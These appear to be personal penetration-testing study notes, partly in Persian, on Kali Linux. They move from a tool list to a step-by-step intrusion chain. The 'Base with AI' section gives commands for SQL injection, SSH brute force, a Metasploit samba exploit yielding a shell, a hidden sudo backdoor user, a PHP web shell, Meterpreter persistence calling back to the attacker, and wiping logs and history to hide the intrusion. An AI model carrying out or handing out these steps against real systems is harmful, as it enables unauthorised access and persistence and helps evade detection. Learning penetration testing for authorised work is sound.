"Network Options" :{
    📊 مقایسه حالت‌های شبکه برای تست نفوذ
    حالت شبکه	تست نفوذ بی‌سیم	تست شبکه داخلی	دسترسی اینترنت	امنیت
    NAT		❌				❌			✅		✅✅✅
    Bridged	✅				✅			✅		  ❌
    Host-Only	❌				✅			❌		✅✅✅
    Internal	❌				✅			❌	     ✅✅✅✅
  }

"Base with Linux Journal" : [

  0- Source => https://www.linuxjournal.com/content/hacking-made-easy-beginners-guide-penetration-testing-kali-linux

  1- install kali-linux method :{
    primary OS Installation => main operating system in computer
    Virtual Machine Installation => This method is convenient for testing and development purposes
    Live Boot => run os from usb disk without installation
  }

  2- Update Kali-Linux : {
    Update Package list => "sudo apt update , sudo apt upgrade"
    Install Additional Tools =>  Use the apt package manager to install these tools.
    Setup non-root user => For security reasons , "sudo adduser <username>"
  }

  3- Essential Tools :{

    Information Gathering 
      . Nmap => nmap -sV <target_ip>
      . Whois => whois <domain_name>
      . DNSenum => dnsenum <domain_name>

    Vulnerability Analysis 
      . OpenVAS => openvas-setup openvas-start
      . Nikto => nikto -h <target_ip>
      . WPScan => wpscan --url <target_url>

    Exploitation Tools 
      . Metasploit => msfconsole , search <exploit_name> 
          , use <exploit_path> set RHOST <target_ip>
            set PAYLOAD <payload_name> set LHOST <local_ip> , exploit
      . BeEF => beef-xss
      . SqlMap => sqlmap -u <target_url>


    Password Attacks 
      . John-the-Ripper => john <hash_file>
      . Hydra => hydra -l <username> -P <password_list> <target_ip> <service>
      . Hashcat => hashcat -m <hash_type> <hash_file> <wordlist>

    Wireless Attacks 
      . Aircrack-ng => airmon-ng start <interface> airodump-ng <interface> aircrack-ng <capture_file>
      . Reaver => reaver -i <interface> -b <bssid> -vv
      . Fern-WIFI-Cracker => 

    Forensics Tools 
     . Autopsy => autopsy
     . Foremost => foremost -i <image_file> -o <output_directory>
     . Volatility => volatility -f <memory_dump> --profile=<profile> <plugin>

  }

  4- Advanced Techniques :{
    . Customizing Tools for Specific Needs 
    . Scripting and Automation 
    . Integrating Other Open Source Tools 

  }
]

Base with AI : [
  1. Reconnaissance :
    [
      passive : جمع آوری اطلاعات از منابع عمومی
      [
        // دریافت نام و ادرس و تماس صاحب سرور ها
        whois ["website"]

        // بررسی اطلاعات dns 
        nslookup ["website"]
        dig any ["website"]

        // جستجو subdomain
        sublist3r -d ["website"]
        amass enum -d ["website"]
      ] 

      active : جمع‌آوری اطلاعات از منابع محدود و خصوصی
      [
        netdiscover -r [ip]
        nmap -sn [ bound ips]
      ]
    ]

  2. Scanning : 
    [
      port scaning : 
      [
        quick scan => nmap -sS -T4 [ip]
        all scan => nmap -p- -T4 [ip] -oN [file name and address]
      ]
      service detection :
      [
        nmap -sV -sC -O [ip]
      ]
      vulnerabile scaning : 
      [
        secure script => nmap --script vuln [ip]
        web app => nikto -h [ip]
      ]

    ]
  
  3. Gaining Access :
    [
      web app attacking :
      [
        sqlmap -u ["url + /login.php?user=admin&pass=test"] --level=3 --risk=2
        if sucsess : ["url + /login.php?user=admin&pass=test"] --dbs 
      ]
      samba : 
      [
        shared list : smbclient -l [ip] -N 
        connection : smbclient //[ip]/public -N
        search file : smb:\ ...
      ]

      brute force :
      [
        hydra -l users.txt -P /usr/share/wordlists/rockyou.txt [ip] ssh -t 4
      ]
      
      metasploit : اگرsamba آسیب بذیر بود
      [
        msfconsole 
        search samba 4.7.6
        use exploit/linux/samba/is_known_pipename
        set RHOSTS [ip]
        exploit
        meterpreter > shell 
        whoami
      ]

      printer attack : 
      [
        echo "@PJL INFO ID" | [ip] 9100 
      ]
    ]

  4. Maintaining Access :
    [
      create backdoor :
      [
        0. useradd -r -m -s /bin/bash hiddenuser
        1. add hidden user => chpasswd
        2. add to sudo => tee -a /etc/sudoers
        3. setup ssh key [
          ssh-keygen -f ['name']
          ssh-copy-id -i ['name'].pub [username]@[ip]
        ]
      ]

      web shell : 
      [
        1. upload php shell => echo '<?php system($_GET["cmd"]); ?> /var/www/html/shell.php'
        2. access => curl "[ip]/shel.php?cmd=whoami"
      ]

      persistence with metasploit :
      [
        meterpreter > run persistence -S -U -i 60 -p 4444 -r [ip]
        // -s : اجرا هنگام راه اندازی
        // -U : اجرا هنگام لاگین کاربر
        // -i : اتصال ۶۰ ثانیه
        // -p : port
        // -r : ip kali
      ]
    ]

  5. Covering Track:
    [
      clear logs => shred -zu [/var/log/fils]
      clear history => history -c , rm ~/.bash_history
      clear temp file => rm -f /[var,tmp,dev]/[www,shm,backdoor] , meterpreter > clearev
      change date files
    ]
]



